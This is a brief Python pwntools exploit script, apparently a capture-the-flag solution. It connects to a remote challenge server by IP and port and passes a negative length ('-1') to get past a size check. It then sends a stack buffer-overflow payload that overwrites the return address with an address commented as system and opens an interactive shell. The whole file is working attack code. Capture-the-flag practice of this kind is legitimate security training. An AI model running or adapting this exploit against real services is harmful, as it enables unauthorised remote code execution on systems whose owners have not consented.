from pwn import *
p = remote('1.14.71.254',28732)
a=0x400726 #system_addres

p.sendlineafter("name:",'-1')
#p.sendlineafter("name:",'2147483648')

pause()
payload=b'a'*0x18+p64(a)
p.sendline(payload)
p.interactive()
